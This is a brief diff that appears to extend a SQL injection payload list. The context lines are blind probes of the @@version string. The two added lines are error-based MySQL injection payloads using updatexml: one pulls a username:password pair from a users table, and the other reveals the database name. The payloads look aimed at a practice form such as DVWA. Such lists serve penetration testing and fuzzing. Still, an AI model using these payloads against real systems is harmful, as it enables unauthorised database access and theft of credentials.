@@ -170,3 +170,5 @@
 ' and (select substring(@@version,3,1))='c'
 ' and (select substring(@@version,3,1))='S'
 ' and (select substring(@@version,3,1))='X'
+' and updatexml(0,concat(0x7e, (select a from (select concat(username,':',password) a from users limit 0,1)x)),1) -- a&submit=Submit
+Hyafinthus' updatexml(1,concat('#',(database())),0)--+
